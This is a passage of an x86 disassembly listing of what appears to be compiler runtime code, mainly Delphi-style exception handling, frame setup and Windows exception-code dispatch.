  402997:	74 0a                	je     0x4029a3
  402999:	59                   	pop    %ecx
  40299a:	8b 5b ec             	mov    -0x14(%ebx),%ebx
  40299d:	85 db                	test   %ebx,%ebx
  40299f:	75 e5                	jne    0x402986
  4029a1:	5f                   	pop    %edi
  4029a2:	c3                   	ret
  4029a3:	58                   	pop    %eax
  4029a4:	01 c0                	add    %eax,%eax
  4029a6:	29 c8                	sub    %ecx,%eax
  4029a8:	8b 5c 47 fc          	mov    -0x4(%edi,%eax,2),%ebx
  4029ac:	5f                   	pop    %edi
  4029ad:	c3                   	ret
  4029ae:	8b c0                	mov    %eax,%eax
  4029b0:	39 d0                	cmp    %edx,%eax
  4029b2:	74 08                	je     0x4029bc
  4029b4:	8b 40 ec             	mov    -0x14(%eax),%eax
  4029b7:	85 c0                	test   %eax,%eax
  4029b9:	75 f5                	jne    0x4029b0
  4029bb:	c3                   	ret
  4029bc:	b0 01                	mov    $0x1,%al
  4029be:	c3                   	ret
  4029bf:	90                   	nop
  4029c0:	8b 40 d4             	mov    -0x2c(%eax),%eax
  4029c3:	c3                   	ret
  4029c4:	c3                   	ret
  4029c5:	8d 40 00             	lea    0x0(%eax),%eax
  4029c8:	53                   	push   %ebx
  4029c9:	66 8b 1a             	mov    (%edx),%bx
  4029cc:	66 09 db             	or     %bx,%bx
  4029cf:	74 17                	je     0x4029e8
  4029d1:	66 81 fb 00 c0       	cmp    $0xc000,%bx
  4029d6:	73 10                	jae    0x4029e8
  4029d8:	50                   	push   %eax
  4029d9:	8b 00                	mov    (%eax),%eax
  4029db:	e8 a4 ff ff ff       	call   0x402984
  4029e0:	58                   	pop    %eax
  4029e1:	74 05                	je     0x4029e8
  4029e3:	89 d9                	mov    %ebx,%ecx
  4029e5:	5b                   	pop    %ebx
  4029e6:	ff e1                	jmp    *%ecx
  4029e8:	5b                   	pop    %ebx
  4029e9:	8b 08                	mov    (%eax),%ecx
  4029eb:	ff 61 f0             	jmp    *-0x10(%ecx)
  4029ee:	c3                   	ret
  4029ef:	90                   	nop
  4029f0:	53                   	push   %ebx
  4029f1:	56                   	push   %esi
  4029f2:	57                   	push   %edi
  4029f3:	31 c9                	xor    %ecx,%ecx
  4029f5:	31 ff                	xor    %edi,%edi
  4029f7:	8a 1a                	mov    (%edx),%bl
  4029f9:	8b 70 dc             	mov    -0x24(%eax),%esi
  4029fc:	85 f6                	test   %esi,%esi
  4029fe:	74 15                	je     0x402a15
  402a00:	66 8b 3e             	mov    (%esi),%di
  402a03:	83 c6 02             	add    $0x2,%esi
  402a06:	8a 4e 06             	mov    0x6(%esi),%cl
  402a09:	38 d9                	cmp    %bl,%cl
  402a0b:	74 15                	je     0x402a22
  402a0d:	66 8b 0e             	mov    (%esi),%cx
  402a10:	01 ce                	add    %ecx,%esi
  402a12:	4f                   	dec    %edi
  402a13:	75 f1                	jne    0x402a06
  402a15:	8b 40 ec             	mov    -0x14(%eax),%eax
  402a18:	85 c0                	test   %eax,%eax
  402a1a:	75 dd                	jne    0x4029f9
  402a1c:	eb 18                	jmp    0x402a36
  402a1e:	8a 1a                	mov    (%edx),%bl
  402a20:	eb eb                	jmp    0x402a0d
  402a22:	b5 00                	mov    $0x0,%ch
  402a24:	8a 5c 0e 06          	mov    0x6(%esi,%ecx,1),%bl
  402a28:	32 1c 0a             	xor    (%edx,%ecx,1),%bl
  402a2b:	80 e3 df             	and    $0xdf,%bl
  402a2e:	75 ee                	jne    0x402a1e
  402a30:	49                   	dec    %ecx
  402a31:	75 f1                	jne    0x402a24
  402a33:	8b 46 02             	mov    0x2(%esi),%eax
  402a36:	5f                   	pop    %edi
  402a37:	5e                   	pop    %esi
  402a38:	5b                   	pop    %ebx
  402a39:	c3                   	ret
  402a3a:	8b c0                	mov    %eax,%eax
  402a3c:	53                   	push   %ebx
  402a3d:	56                   	push   %esi
  402a3e:	57                   	push   %edi
  402a3f:	89 cf                	mov    %ecx,%edi
  402a41:	31 db                	xor    %ebx,%ebx
  402a43:	31 c9                	xor    %ecx,%ecx
  402a45:	8b 70 dc             	mov    -0x24(%eax),%esi
  402a48:	85 f6                	test   %esi,%esi
  402a4a:	74 13                	je     0x402a5f
  402a4c:	66 8b 0e             	mov    (%esi),%cx
  402a4f:	83 c6 02             	add    $0x2,%esi
  402a52:	3b 56 02             	cmp    0x2(%esi),%edx
  402a55:	74 13                	je     0x402a6a
  402a57:	66 8b 1e             	mov    (%esi),%bx
  402a5a:	01 de                	add    %ebx,%esi
  402a5c:	49                   	dec    %ecx
  402a5d:	75 f3                	jne    0x402a52
  402a5f:	8b 40 ec             	mov    -0x14(%eax),%eax
  402a62:	85 c0                	test   %eax,%eax
  402a64:	75 df                	jne    0x402a45
  402a66:	88 07                	mov    %al,(%edi)
  402a68:	eb 0a                	jmp    0x402a74
  402a6a:	83 c6 06             	add    $0x6,%esi
  402a6d:	31 c9                	xor    %ecx,%ecx
  402a6f:	8a 0e                	mov    (%esi),%cl
  402a71:	41                   	inc    %ecx
  402a72:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402a74:	5f                   	pop    %edi
  402a75:	5e                   	pop    %esi
  402a76:	5b                   	pop    %ebx
  402a77:	c3                   	ret
  402a78:	53                   	push   %ebx
  402a79:	56                   	push   %esi
  402a7a:	57                   	push   %edi
  402a7b:	31 c9                	xor    %ecx,%ecx
  402a7d:	31 ff                	xor    %edi,%edi
  402a7f:	8a 1a                	mov    (%edx),%bl
  402a81:	50                   	push   %eax
  402a82:	8b 00                	mov    (%eax),%eax
  402a84:	8b 70 d8             	mov    -0x28(%eax),%esi
  402a87:	85 f6                	test   %esi,%esi
  402a89:	74 14                	je     0x402a9f
  402a8b:	66 8b 3e             	mov    (%esi),%di
  402a8e:	83 c6 06             	add    $0x6,%esi
  402a91:	8a 4e 06             	mov    0x6(%esi),%cl
  402a94:	38 d9                	cmp    %bl,%cl
  402a96:	74 18                	je     0x402ab0
  402a98:	8d 74 0e 07          	lea    0x7(%esi,%ecx,1),%esi
  402a9c:	4f                   	dec    %edi
  402a9d:	75 f2                	jne    0x402a91
  402a9f:	8b 40 ec             	mov    -0x14(%eax),%eax
  402aa2:	85 c0                	test   %eax,%eax
  402aa4:	75 de                	jne    0x402a84
  402aa6:	5a                   	pop    %edx
  402aa7:	eb 1b                	jmp    0x402ac4
  402aa9:	8a 1a                	mov    (%edx),%bl
  402aab:	8a 4e 06             	mov    0x6(%esi),%cl
  402aae:	eb e8                	jmp    0x402a98
  402ab0:	8a 5c 0e 06          	mov    0x6(%esi,%ecx,1),%bl
  402ab4:	32 1c 0a             	xor    (%edx,%ecx,1),%bl
  402ab7:	80 e3 df             	and    $0xdf,%bl
  402aba:	75 ed                	jne    0x402aa9
  402abc:	49                   	dec    %ecx
  402abd:	75 f1                	jne    0x402ab0
  402abf:	8b 06                	mov    (%esi),%eax
  402ac1:	5a                   	pop    %edx
  402ac2:	01 d0                	add    %edx,%eax
  402ac4:	5f                   	pop    %edi
  402ac5:	5e                   	pop    %esi
  402ac6:	5b                   	pop    %ebx
  402ac7:	c3                   	ret
  402ac8:	52                   	push   %edx
  402ac9:	51                   	push   %ecx
  402aca:	53                   	push   %ebx
  402acb:	ff 50 f4             	call   *-0xc(%eax)
  402ace:	31 d2                	xor    %edx,%edx
  402ad0:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402ad4:	64 8b 1a             	mov    %fs:(%edx),%ebx
  402ad7:	89 19                	mov    %ebx,(%ecx)
  402ad9:	89 69 08             	mov    %ebp,0x8(%ecx)
  402adc:	c7 41 04 ed 2a 40 00 	movl   $0x402aed,0x4(%ecx)
  402ae3:	89 41 0c             	mov    %eax,0xc(%ecx)
  402ae6:	64 89 0a             	mov    %ecx,%fs:(%edx)
  402ae9:	5b                   	pop    %ebx
  402aea:	59                   	pop    %ecx
  402aeb:	5a                   	pop    %edx
  402aec:	c3                   	ret
  402aed:	e9 16 01 00 00       	jmp    0x402c08
  402af2:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  402af6:	8b 40 0c             	mov    0xc(%eax),%eax
  402af9:	e8 26 fe ff ff       	call   0x402924
  402afe:	e8 cd 03 00 00       	call   0x402ed0
  402b03:	c3                   	ret
  402b04:	8b 10                	mov    (%eax),%edx
  402b06:	ff 52 f8             	call   *-0x8(%edx)
  402b09:	c3                   	ret
  402b0a:	8b c0                	mov    %eax,%eax
  402b0c:	80 3d 00 a0 40 00 01 	cmpb   $0x1,0x40a000
  402b13:	76 10                	jbe    0x402b25
  402b15:	6a 00                	push   $0x0
  402b17:	6a 00                	push   $0x0
  402b19:	6a 00                	push   $0x0
  402b1b:	68 cf fa ed 0e       	push   $0xeedfacf
  402b20:	e8 97 e6 ff ff       	call   0x4011bc
  402b25:	c3                   	ret
  402b26:	8b c0                	mov    %eax,%eax
  402b28:	80 3d 00 a0 40 00 00 	cmpb   $0x0,0x40a000
  402b2f:	74 16                	je     0x402b47
  402b31:	50                   	push   %eax
  402b32:	50                   	push   %eax
  402b33:	52                   	push   %edx
  402b34:	54                   	push   %esp
  402b35:	6a 02                	push   $0x2
  402b37:	6a 00                	push   $0x0
  402b39:	68 d4 fa ed 0e       	push   $0xeedfad4
  402b3e:	e8 79 e6 ff ff       	call   0x4011bc
  402b43:	83 c4 08             	add    $0x8,%esp
  402b46:	58                   	pop    %eax
  402b47:	c3                   	ret
  402b48:	54                   	push   %esp
  402b49:	6a 01                	push   $0x1
  402b4b:	6a 00                	push   $0x0
  402b4d:	68 d0 fa ed 0e       	push   $0xeedfad0
  402b52:	e8 65 e6 ff ff       	call   0x4011bc
  402b57:	83 c4 04             	add    $0x4,%esp
  402b5a:	58                   	pop    %eax
  402b5b:	c3                   	ret
  402b5c:	80 3d 00 a0 40 00 01 	cmpb   $0x1,0x40a000
  402b63:	76 09                	jbe    0x402b6e
  402b65:	50                   	push   %eax
  402b66:	ff 73 04             	push   0x4(%ebx)
  402b69:	e9 da ff ff ff       	jmp    0x402b48
  402b6e:	c3                   	ret
  402b6f:	90                   	nop
  402b70:	80 3d 00 a0 40 00 01 	cmpb   $0x1,0x40a000
  402b77:	76 07                	jbe    0x402b80
  402b79:	50                   	push   %eax
  402b7a:	53                   	push   %ebx
  402b7b:	e9 c8 ff ff ff       	jmp    0x402b48
  402b80:	c3                   	ret
  402b81:	8d 40 00             	lea    0x0(%eax),%eax
  402b84:	85 c9                	test   %ecx,%ecx
  402b86:	74 19                	je     0x402ba1
  402b88:	8b 41 01             	mov    0x1(%ecx),%eax
  402b8b:	80 39 e9             	cmpb   $0xe9,(%ecx)
  402b8e:	74 0c                	je     0x402b9c
  402b90:	80 39 eb             	cmpb   $0xeb,(%ecx)
  402b93:	75 0c                	jne    0x402ba1
  402b95:	0f be c0             	movsbl %al,%eax
  402b98:	41                   	inc    %ecx
  402b99:	41                   	inc    %ecx
  402b9a:	eb 03                	jmp    0x402b9f
  402b9c:	83 c1 05             	add    $0x5,%ecx
  402b9f:	01 c1                	add    %eax,%ecx
  402ba1:	c3                   	ret
  402ba2:	8b c0                	mov    %eax,%eax
  402ba4:	80 3d 00 a0 40 00 01 	cmpb   $0x1,0x40a000
  402bab:	76 1c                	jbe    0x402bc9
  402bad:	50                   	push   %eax
  402bae:	52                   	push   %edx
  402baf:	51                   	push   %ecx
  402bb0:	e8 cf ff ff ff       	call   0x402b84
  402bb5:	51                   	push   %ecx
  402bb6:	54                   	push   %esp
  402bb7:	6a 01                	push   $0x1
  402bb9:	6a 00                	push   $0x0
  402bbb:	68 d1 fa ed 0e       	push   $0xeedfad1
  402bc0:	e8 f7 e5 ff ff       	call   0x4011bc
  402bc5:	59                   	pop    %ecx
  402bc6:	59                   	pop    %ecx
  402bc7:	5a                   	pop    %edx
  402bc8:	58                   	pop    %eax
  402bc9:	c3                   	ret
  402bca:	8b c0                	mov    %eax,%eax
  402bcc:	80 3d 00 a0 40 00 01 	cmpb   $0x1,0x40a000
  402bd3:	76 11                	jbe    0x402be6
  402bd5:	52                   	push   %edx
  402bd6:	54                   	push   %esp
  402bd7:	6a 01                	push   $0x1
  402bd9:	6a 00                	push   $0x0
  402bdb:	68 d2 fa ed 0e       	push   $0xeedfad2
  402be0:	e8 d7 e5 ff ff       	call   0x4011bc
  402be5:	5a                   	pop    %edx
  402be6:	c3                   	ret
  402be7:	90                   	nop
  402be8:	80 3d 00 a0 40 00 01 	cmpb   $0x1,0x40a000
  402bef:	76 13                	jbe    0x402c04
  402bf1:	50                   	push   %eax
  402bf2:	52                   	push   %edx
  402bf3:	54                   	push   %esp
  402bf4:	6a 02                	push   $0x2
  402bf6:	6a 00                	push   $0x0
  402bf8:	68 d3 fa ed 0e       	push   $0xeedfad3
  402bfd:	e8 ba e5 ff ff       	call   0x4011bc
  402c02:	5a                   	pop    %edx
  402c03:	58                   	pop    %eax
  402c04:	c3                   	ret
  402c05:	8d 40 00             	lea    0x0(%eax),%eax
  402c08:	8b 44 24 04          	mov    0x4(%esp),%eax
  402c0c:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402c13:	0f 85 ac 00 00 00    	jne    0x402cc5
  402c19:	81 38 ce fa ed 0e    	cmpl   $0xeedface,(%eax)
  402c1f:	8b 50 18             	mov    0x18(%eax),%edx
  402c22:	8b 48 14             	mov    0x14(%eax),%ecx
  402c25:	74 2f                	je     0x402c56
  402c27:	e8 30 fc ff ff       	call   0x40285c
  402c2c:	8b 15 0c b0 40 00    	mov    0x40b00c,%edx
  402c32:	85 d2                	test   %edx,%edx
  402c34:	0f 84 8b 00 00 00    	je     0x402cc5
  402c3a:	ff d2                	call   *%edx
  402c3c:	85 c0                	test   %eax,%eax
  402c3e:	0f 84 81 00 00 00    	je     0x402cc5
  402c44:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402c48:	e8 db fe ff ff       	call   0x402b28
  402c4d:	89 c2                	mov    %eax,%edx
  402c4f:	8b 44 24 04          	mov    0x4(%esp),%eax
  402c53:	8b 48 0c             	mov    0xc(%eax),%ecx
  402c56:	83 48 04 02          	orl    $0x2,0x4(%eax)
  402c5a:	53                   	push   %ebx
  402c5b:	31 db                	xor    %ebx,%ebx
  402c5d:	56                   	push   %esi
  402c5e:	57                   	push   %edi
  402c5f:	55                   	push   %ebp
  402c60:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  402c63:	53                   	push   %ebx
  402c64:	50                   	push   %eax
  402c65:	52                   	push   %edx
  402c66:	51                   	push   %ecx
  402c67:	8b 54 24 28          	mov    0x28(%esp),%edx
  402c6b:	6a 00                	push   $0x0
  402c6d:	50                   	push   %eax
  402c6e:	68 79 2c 40 00       	push   $0x402c79
  402c73:	52                   	push   %edx
  402c74:	e8 53 e5 ff ff       	call   0x4011cc
  402c79:	8b 7c 24 28          	mov    0x28(%esp),%edi
  402c7d:	e8 d2 04 00 00       	call   0x403154
  402c82:	ff b0 00 00 00 00    	push   0x0(%eax)
  402c88:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  402c8e:	8b 6f 08             	mov    0x8(%edi),%ebp
  402c91:	8b 5f 04             	mov    0x4(%edi),%ebx
  402c94:	c7 47 04 a5 2c 40 00 	movl   $0x402ca5,0x4(%edi)
  402c9b:	83 c3 05             	add    $0x5,%ebx
  402c9e:	e8 cd fe ff ff       	call   0x402b70
  402ca3:	ff e3                	jmp    *%ebx
  402ca5:	e9 52 01 00 00       	jmp    0x402dfc
  402caa:	e8 a5 04 00 00       	call   0x403154
  402caf:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  402cb5:	8b 11                	mov    (%ecx),%edx
  402cb7:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  402cbd:	8b 41 08             	mov    0x8(%ecx),%eax
  402cc0:	e9 5f fc ff ff       	jmp    0x402924
  402cc5:	b8 01 00 00 00       	mov    $0x1,%eax
  402cca:	c3                   	ret
  402ccb:	90                   	nop
  402ccc:	8b 44 24 04          	mov    0x4(%esp),%eax
  402cd0:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402cd7:	0f 85 17 01 00 00    	jne    0x402df4
  402cdd:	81 38 ce fa ed 0e    	cmpl   $0xeedface,(%eax)
  402ce3:	74 1e                	je     0x402d03
  402ce5:	e8 72 fb ff ff       	call   0x40285c
  402cea:	8b 15 08 b0 40 00    	mov    0x40b008,%edx
  402cf0:	85 d2                	test   %edx,%edx
  402cf2:	0f 84 fc 00 00 00    	je     0x402df4
  402cf8:	ff d2                	call   *%edx
  402cfa:	85 c0                	test   %eax,%eax
  402cfc:	75 0a                	jne    0x402d08
  402cfe:	e9 f1 00 00 00       	jmp    0x402df4
  402d03:	8b 40 18             	mov    0x18(%eax),%eax
  402d06:	8b 00                	mov    (%eax),%eax
  402d08:	8b 54 24 08          	mov    0x8(%esp),%edx
  402d0c:	53                   	push   %ebx
  402d0d:	56                   	push   %esi
  402d0e:	57                   	push   %edi
  402d0f:	55                   	push   %ebp
  402d10:	8b 4a 04             	mov    0x4(%edx),%ecx
  402d13:	8b 59 05             	mov    0x5(%ecx),%ebx
  402d16:	8d 71 09             	lea    0x9(%ecx),%esi
  402d19:	89 c5                	mov    %eax,%ebp
  402d1b:	8b 06                	mov    (%esi),%eax
  402d1d:	85 c0                	test   %eax,%eax
  402d1f:	74 3d                	je     0x402d5e
  402d21:	89 ef                	mov    %ebp,%edi
  402d23:	39 f8                	cmp    %edi,%eax
  402d25:	74 37                	je     0x402d5e
  402d27:	8b 48 e8             	mov    -0x18(%eax),%ecx
  402d2a:	3b 4f e8             	cmp    -0x18(%edi),%ecx
  402d2d:	75 17                	jne    0x402d46
  402d2f:	8b 40 e4             	mov    -0x1c(%eax),%eax
  402d32:	8b 57 e4             	mov    -0x1c(%edi),%edx
  402d35:	31 c9                	xor    %ecx,%ecx
  402d37:	8a 08                	mov    (%eax),%cl
  402d39:	3a 0a                	cmp    (%edx),%cl
  402d3b:	75 09                	jne    0x402d46
  402d3d:	40                   	inc    %eax
  402d3e:	42                   	inc    %edx
  402d3f:	e8 c8 f9 ff ff       	call   0x40270c
  402d44:	74 18                	je     0x402d5e
  402d46:	8b 7f ec             	mov    -0x14(%edi),%edi
  402d49:	8b 06                	mov    (%esi),%eax
  402d4b:	85 ff                	test   %edi,%edi
  402d4d:	75 d4                	jne    0x402d23
  402d4f:	83 c6 08             	add    $0x8,%esi
  402d52:	4b                   	dec    %ebx
  402d53:	75 c6                	jne    0x402d1b
  402d55:	5d                   	pop    %ebp
  402d56:	5f                   	pop    %edi
  402d57:	5e                   	pop    %esi
  402d58:	5b                   	pop    %ebx
  402d59:	e9 96 00 00 00       	jmp    0x402df4
  402d5e:	8b 44 24 14          	mov    0x14(%esp),%eax
  402d62:	81 38 ce fa ed 0e    	cmpl   $0xeedface,(%eax)
  402d68:	8b 50 18             	mov    0x18(%eax),%edx
  402d6b:	8b 48 14             	mov    0x14(%eax),%ecx
  402d6e:	74 18                	je     0x402d88
  402d70:	ff 15 0c b0 40 00    	call   *0x40b00c
  402d76:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402d7a:	e8 a9 fd ff ff       	call   0x402b28
  402d7f:	89 c2                	mov    %eax,%edx
  402d81:	8b 44 24 14          	mov    0x14(%esp),%eax
  402d85:	8b 48 0c             	mov    0xc(%eax),%ecx
  402d88:	31 db                	xor    %ebx,%ebx
  402d8a:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  402d8d:	53                   	push   %ebx
  402d8e:	50                   	push   %eax
  402d8f:	52                   	push   %edx
  402d90:	51                   	push   %ecx
  402d91:	8b 54 24 28          	mov    0x28(%esp),%edx
  402d95:	83 48 04 02          	orl    $0x2,0x4(%eax)
  402d99:	56                   	push   %esi
  402d9a:	6a 00                	push   $0x0
  402d9c:	50                   	push   %eax
  402d9d:	68 a8 2d 40 00       	push   $0x402da8
  402da2:	52                   	push   %edx
  402da3:	e8 24 e4 ff ff       	call   0x4011cc
  402da8:	5b                   	pop    %ebx
  402da9:	8b 7c 24 28          	mov    0x28(%esp),%edi
  402dad:	e8 a2 03 00 00       	call   0x403154
  402db2:	ff b0 00 00 00 00    	push   0x0(%eax)
  402db8:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  402dbe:	8b 6f 08             	mov    0x8(%edi),%ebp
  402dc1:	c7 47 04 d4 2d 40 00 	movl   $0x402dd4,0x4(%edi)
  402dc8:	8b 44 24 08          	mov    0x8(%esp),%eax
  402dcc:	e8 8b fd ff ff       	call   0x402b5c
  402dd1:	ff 63 04             	jmp    *0x4(%ebx)
  402dd4:	e9 23 00 00 00       	jmp    0x402dfc
  402dd9:	e8 76 03 00 00       	call   0x403154
  402dde:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  402de4:	8b 11                	mov    (%ecx),%edx
  402de6:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  402dec:	8b 41 08             	mov    0x8(%ecx),%eax
  402def:	e9 30 fb ff ff       	jmp    0x402924
  402df4:	b8 01 00 00 00       	mov    $0x1,%eax
  402df9:	c3                   	ret
  402dfa:	8b c0                	mov    %eax,%eax
  402dfc:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e00:	8b 54 24 08          	mov    0x8(%esp),%edx
  402e04:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402e0b:	74 1f                	je     0x402e2c
  402e0d:	8b 4a 04             	mov    0x4(%edx),%ecx
  402e10:	c7 42 04 2c 2e 40 00 	movl   $0x402e2c,0x4(%edx)
  402e17:	53                   	push   %ebx
  402e18:	56                   	push   %esi
  402e19:	57                   	push   %edi
  402e1a:	55                   	push   %ebp
  402e1b:	8b 6a 08             	mov    0x8(%edx),%ebp
  402e1e:	83 c1 05             	add    $0x5,%ecx
  402e21:	e8 7e fd ff ff       	call   0x402ba4
  402e26:	ff d1                	call   *%ecx
  402e28:	5d                   	pop    %ebp
  402e29:	5f                   	pop    %edi
  402e2a:	5e                   	pop    %esi
  402e2b:	5b                   	pop    %ebx
  402e2c:	b8 01 00 00 00       	mov    $0x1,%eax
  402e31:	c3                   	ret
  402e32:	8b c0                	mov    %eax,%eax
  402e34:	55                   	push   %ebp
  402e35:	31 ed                	xor    %ebp,%ebp
  402e37:	68 64 2e 40 00       	push   $0x402e64
  402e3c:	64 ff 75 00          	push   %fs:0x0(%ebp)
  402e40:	64 89 65 00          	mov    %esp,%fs:0x0(%ebp)
  402e44:	85 f6                	test   %esi,%esi
  402e46:	74 0e                	je     0x402e56
  402e48:	78 0a                	js     0x402e54
  402e4a:	4e                   	dec    %esi
  402e4b:	8b 2c b7             	mov    (%edi,%esi,4),%ebp
  402e4e:	4e                   	dec    %esi
  402e4f:	55                   	push   %ebp
  402e50:	79 f9                	jns    0x402e4b
  402e52:	eb 02                	jmp    0x402e56
  402e54:	db 2f                	fldt   (%edi)
  402e56:	ff d3                	call   *%ebx
  402e58:	31 d2                	xor    %edx,%edx
  402e5a:	31 c9                	xor    %ecx,%ecx
  402e5c:	eb 47                	jmp    0x402ea5
  402e5e:	b8 01 00 00 00       	mov    $0x1,%eax
  402e63:	c3                   	ret
  402e64:	e8 f3 f9 ff ff       	call   0x40285c
  402e69:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e6d:	8b 54 24 08          	mov    0x8(%esp),%edx
  402e71:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  402e78:	75 e4                	jne    0x402e5e
  402e7a:	83 48 04 02          	orl    $0x2,0x4(%eax)
  402e7e:	6a 00                	push   $0x0
  402e80:	50                   	push   %eax
  402e81:	68 8c 2e 40 00       	push   $0x402e8c
  402e86:	52                   	push   %edx
  402e87:	e8 40 e3 ff ff       	call   0x4011cc
  402e8c:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e90:	8b 08                	mov    (%eax),%ecx
  402e92:	8b 50 18             	mov    0x18(%eax),%edx
  402e95:	81 f9 ce fa ed 0e    	cmp    $0xeedface,%ecx
  402e9b:	75 05                	jne    0x402ea2
  402e9d:	8b 40 14             	mov    0x14(%eax),%eax
  402ea0:	eb 03                	jmp    0x402ea5
  402ea2:	8b 40 0c             	mov    0xc(%eax),%eax
  402ea5:	31 ed                	xor    %ebp,%ebp
  402ea7:	64 8b 65 00          	mov    %fs:0x0(%ebp),%esp
  402eab:	64 8f 45 00          	pop    %fs:0x0(%ebp)
  402eaf:	5d                   	pop    %ebp
  402eb0:	c3                   	ret
  402eb1:	8d 40 00             	lea    0x0(%eax),%eax
  402eb4:	5a                   	pop    %edx
  402eb5:	54                   	push   %esp
  402eb6:	55                   	push   %ebp
  402eb7:	57                   	push   %edi
  402eb8:	56                   	push   %esi
  402eb9:	53                   	push   %ebx
  402eba:	50                   	push   %eax
  402ebb:	52                   	push   %edx
  402ebc:	54                   	push   %esp
  402ebd:	6a 07                	push   $0x7
  402ebf:	6a 01                	push   $0x1
  402ec1:	68 ce fa ed 0e       	push   $0xeedface
  402ec6:	52                   	push   %edx
  402ec7:	e9 f0 e2 ff ff       	jmp    0x4011bc
  402ecc:	c3                   	ret
  402ecd:	8d 40 00             	lea    0x0(%eax),%eax
  402ed0:	8b 44 24 30          	mov    0x30(%esp),%eax
  402ed4:	c7 40 04 1b 2f 40 00 	movl   $0x402f1b,0x4(%eax)
  402edb:	e8 74 02 00 00       	call   0x403154
  402ee0:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  402ee6:	8b 0a                	mov    (%edx),%ecx
  402ee8:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  402eee:	8b 42 0c             	mov    0xc(%edx),%eax
  402ef1:	83 60 04 fd          	andl   $0xfffffffd,0x4(%eax)
  402ef5:	81 38 ce fa ed 0e    	cmpl   $0xeedface,(%eax)
  402efb:	74 0d                	je     0x402f0a
  402efd:	8b 42 08             	mov    0x8(%edx),%eax
  402f00:	e8 1f fa ff ff       	call   0x402924
  402f05:	e8 02 fc ff ff       	call   0x402b0c
  402f0a:	31 c0                	xor    %eax,%eax
  402f0c:	83 c4 14             	add    $0x14,%esp
  402f0f:	64 8b 10             	mov    %fs:(%eax),%edx
  402f12:	59                   	pop    %ecx
  402f13:	8b 12                	mov    (%edx),%edx
  402f15:	89 11                	mov    %edx,(%ecx)
  402f17:	5d                   	pop    %ebp
  402f18:	5f                   	pop    %edi
  402f19:	5e                   	pop    %esi
  402f1a:	5b                   	pop    %ebx
  402f1b:	b8 01 00 00 00       	mov    $0x1,%eax
  402f20:	c3                   	ret
  402f21:	8d 40 00             	lea    0x0(%eax),%eax
  402f24:	e8 2b 02 00 00       	call   0x403154
  402f29:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  402f2f:	8b 0a                	mov    (%edx),%ecx
  402f31:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  402f37:	8b 42 08             	mov    0x8(%edx),%eax
  402f3a:	e8 e5 f9 ff ff       	call   0x402924
  402f3f:	5a                   	pop    %edx
  402f40:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  402f44:	31 c0                	xor    %eax,%eax
  402f46:	59                   	pop    %ecx
  402f47:	64 89 08             	mov    %ecx,%fs:(%eax)
  402f4a:	58                   	pop    %eax
  402f4b:	5d                   	pop    %ebp
  402f4c:	e8 7b fc ff ff       	call   0x402bcc
  402f51:	ff e2                	jmp    *%edx
  402f53:	c3                   	ret
  402f54:	31 d2                	xor    %edx,%edx
  402f56:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402f5a:	8b 44 24 04          	mov    0x4(%esp),%eax
  402f5e:	83 c1 05             	add    $0x5,%ecx
  402f61:	64 89 02             	mov    %eax,%fs:(%edx)
  402f64:	ff d1                	call   *%ecx
  402f66:	c2 0c 00             	ret    $0xc
  402f69:	c3                   	ret
  402f6a:	8b c0                	mov    %eax,%eax
  402f6c:	89 14 24             	mov    %edx,(%esp)
  402f6f:	e9 cd 0e 00 00       	jmp    0x403e41
  402f74:	c3                   	ret
  402f75:	8d 40 00             	lea    0x0(%eax),%eax
  402f78:	55                   	push   %ebp
  402f79:	8b ec                	mov    %esp,%ebp
  402f7b:	8b 55 08             	mov    0x8(%ebp),%edx
  402f7e:	8b 02                	mov    (%edx),%eax
  402f80:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  402f85:	7f 2c                	jg     0x402fb3
  402f87:	74 5c                	je     0x402fe5
  402f89:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  402f8e:	7f 15                	jg     0x402fa5
  402f90:	74 57                	je     0x402fe9
  402f92:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  402f97:	74 5c                	je     0x402ff5
  402f99:	2d 87 00 00 00       	sub    $0x87,%eax
  402f9e:	74 3d                	je     0x402fdd
  402fa0:	48                   	dec    %eax
  402fa1:	74 4e                	je     0x402ff1
  402fa3:	eb 60                	jmp    0x403005
  402fa5:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  402faa:	83 e8 02             	sub    $0x2,%eax
  402fad:	72 36                	jb     0x402fe5
  402faf:	74 30                	je     0x402fe1
  402fb1:	eb 52                	jmp    0x403005
  402fb3:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  402fb8:	7f 11                	jg     0x402fcb
  402fba:	74 3d                	je     0x402ff9
  402fbc:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  402fc1:	74 2e                	je     0x402ff1
  402fc3:	48                   	dec    %eax
  402fc4:	74 13                	je     0x402fd9
  402fc6:	48                   	dec    %eax
  402fc7:	74 24                	je     0x402fed
  402fc9:	eb 3a                	jmp    0x403005
  402fcb:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  402fd0:	74 2f                	je     0x403001
  402fd2:	83 e8 3d             	sub    $0x3d,%eax
  402fd5:	74 26                	je     0x402ffd
